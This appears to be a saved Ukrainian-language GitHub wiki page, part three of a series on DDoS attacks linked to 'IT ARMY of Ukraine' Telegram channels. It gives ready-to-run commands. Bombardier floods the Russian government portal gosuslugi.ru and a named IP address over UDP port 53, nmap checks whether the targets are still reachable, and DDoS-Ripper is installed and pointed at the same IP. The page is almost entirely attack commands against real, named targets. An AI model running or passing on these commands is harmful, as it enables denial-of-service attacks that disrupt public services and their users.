
1   -----------
2   Связи: хак
3   Теги:

Телеграм-канал [**DDoS по країні СЕПАРІВ**](https://t.me/+97Y45he5lOI2ZTky)  
Телеграм-канал [**IT ARMY of Ukraine**](https://t.me/itarmyofukraine2022)

# Встановлення Docker

[](https://github.com/virtuaka/hacking/wiki/DDoS-3---Attack-(Bombardier---DDoS-Ripper)#встановлення-docker)

Оригінал інструкції - [https://tarahtino.notion.site/Linux-Kali-7c1f4add86f5413b9c9aff7247c9780d](https://tarahtino.notion.site/Linux-Kali-7c1f4add86f5413b9c9aff7247c9780d)

Команди для встановлення Docker на Kali Linux:

```
sudo apt update
sudo apt install -y docker.io
sudo systemctl enable docker --now
docker
sudo usermod -aG docker $USER
printf '%s\n' "deb https://download.docker.com/linux/debian bullseye stable" |
  sudo tee /etc/apt/sources.list.d/docker-ce.list
curl -fsSL https://download.docker.com/linux/debian/gpg |
  sudo gpg --dearmor -o /etc/apt/trusted.gpg.d/docker-ce-archive-keyring.gpg
sudo apt update
sudo apt install -y docker-ce docker-ce-cli containerd.io
sudo systemctl unmask docker.service
sudo systemctl unmask docker.socket
sudo systemctl start docker.service
sudo chmod 666 /var/run/docker.sock
```

Команда для перевірки чи встановлення було успішним

```
sudo docker run hello-world
```

# Запуск Docker-контейнера з програмою Bombardier

[](https://github.com/virtuaka/hacking/wiki/DDoS-3---Attack-(Bombardier---DDoS-Ripper)#запуск-docker-контейнера-з-програмою-bombardier)

```
docker run -ti alpine/bombardier -c 10000 -d 300s -l https://www.gosuslugi.ru
```

або воно ж, тільки з вказаним портом і протоколом UDP

```
docker run -ti alpine/bombardier -c 1000 -d 60s -l 92.223.100.53:53/UDP   
```

# Перевірка доступності цілі

[](https://github.com/virtuaka/hacking/wiki/DDoS-3---Attack-(Bombardier---DDoS-Ripper)#перевірка-доступності-цілі)

**TCP** (як правило порт 80, 21, 25, 443..):

```
sudo nmap -sT -Pn -p 443  195.242.82.13
```

**UDP** (як правило порт 53):

```
sudo nmap -sU -Pn -p 53 195.242.82.13
```

# Встановлення DDoS-Ripper

[](https://github.com/virtuaka/hacking/wiki/DDoS-3---Attack-(Bombardier---DDoS-Ripper)#встановлення-ddos-ripper)

```
sudo apt-get install python git
cd ~
git clone https://github.com/palahsu/DDoS-Ripper
cd DDoS-Ripper
```

# Запуск DDoS-Ripper:

[](https://github.com/virtuaka/hacking/wiki/DDoS-3---Attack-(Bombardier---DDoS-Ripper)#запуск-ddos-ripper)

```
python3 DRipper.py -s {IP or WebSite} -p {Port} -t 135 -q 10000
тобто
python3 DRipper.py -s 92.223.100.53 -p 53 -t 135 -q 1000
```

### Pages 6

- [Home](https://github.com/virtuaka/hacking/wiki)
    

- [DDOS 1 Virtual Machine (Kali Linux)](https://github.com/virtuaka/hacking/wiki/DDOS-1---Virtual-Machine-(Kali-Linux))
    

- [DDoS 2 VPN (Kali Linux)](https://github.com/virtuaka/hacking/wiki/DDoS-2---VPN-(Kali-Linux))
    

- [DDoS 3 Attack (Bombardier DDoS Ripper)](https://github.com/virtuaka/hacking/wiki/DDoS-3---Attack-(Bombardier---DDoS-Ripper))
    
    - [Координація](https://github.com/virtuaka/hacking/wiki/DDoS-3---Attack-(Bombardier---DDoS-Ripper)#координація)
    - [Встановлення Docker](https://github.com/virtuaka/hacking/wiki/DDoS-3---Attack-(Bombardier---DDoS-Ripper)#встановлення-docker)
    - [Запуск Docker-контейнера з програмою Bombardier](https://github.com/virtuaka/hacking/wiki/DDoS-3---Attack-(Bombardier---DDoS-Ripper)#запуск-docker-контейнера-з-програмою-bombardier)
    - [Перевірка доступності цілі](https://github.com/virtuaka/hacking/wiki/DDoS-3---Attack-(Bombardier---DDoS-Ripper)#перевірка-доступності-цілі)
    - [Встановлення DDoS-Ripper](https://github.com/virtuaka/hacking/wiki/DDoS-3---Attack-(Bombardier---DDoS-Ripper)#встановлення-ddos-ripper)
    - [Запуск DDoS-Ripper:](https://github.com/virtuaka/hacking/wiki/DDoS-3---Attack-(Bombardier---DDoS-Ripper)#запуск-ddos-ripper)
    

- [DDoS ataka](https://github.com/virtuaka/hacking/wiki/DDoS-ataka)
    

- [DDoS Informatsiya](https://github.com/virtuaka/hacking/wiki/DDoS-Informatsiya)
    

##### Clone this wiki locally

## Footer

[](https://github.com "GitHub")